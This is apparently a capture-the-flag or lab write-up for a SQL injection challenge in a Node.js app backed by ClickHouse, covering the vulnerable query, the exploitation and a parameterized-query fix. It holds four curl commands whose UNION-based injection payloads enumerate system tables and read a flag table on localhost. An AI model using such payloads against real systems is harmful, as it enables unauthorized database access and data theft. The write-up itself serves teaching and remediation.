# sqli101 - part 3

## Vulnerability
Unescaped user inputs used in the following SQL query.
```js
db.testQuery("SELECT username\nFROM user\nWHERE username LIKE '%" + search + "%'")
```

## Exploitation
We can list the databases using:
```bash
curl --request POST \
  --url http://localhost:80/user_lookup \
  --header 'Content-Type: application/json' \
  --data '{
  "search": "'\'' AND 1=2 UNION ALL SELECT distinct database FROM system.tables WHERE '\''%'\''='\''"
}'
```

We can find the table flag using:
```bash
curl --request POST \
  --url http://localhost:80/user_lookup \
  --header 'Content-Type: application/json' \
  --data '{
  "search": "'\'' AND 1=2 UNION ALL SELECT name FROM system.tables WHERE database='\''default'\'' AND '\''%'\''='\''"
}'
```

We can find the column flag in the table flag using:
```bash
curl --request POST \
  --url http://localhost:80/user_lookup \
  --header 'Content-Type: application/json' \
  --data '{
  "search": "'\'' AND 1=2 UNION ALL SELECT name FROM system.columns WHERE database='\''default'\'' AND table='\''flag'\'' AND '\''%'\''='\''"
}'
```

And finally read the flag by querying the table and column found:
```bash
curl --request POST \
  --url http://localhost:80/user_lookup \
  --header 'Content-Type: application/json' \
  --data '{
  "search": "'\'' AND 1=2 UNION ALL SELECT flag FROM default.flag WHERE '\''%'\''='\''"
}'
```

## Fix
User inputs should be validated (can use a regex to restrict to a subset of ascii characters).
User inputs can also be escaped.

It is also possible to use query parameterized queries. (cf [ClickHouse documentation](https://clickhouse.com/docs/en/interfaces/cli#cli-queries-with-parameters)).
Implementing that solution changes two files, `routes/index.js` and `database.js`

```js
db.testQuery("SELECT username\nFROM user\nWHERE username LIKE '%{search:String}%'", {'search': search})

async testQuery(query, parameters) {
    return this.clickhouse.query(query, {'params': parameters}).toPromise();
}
```
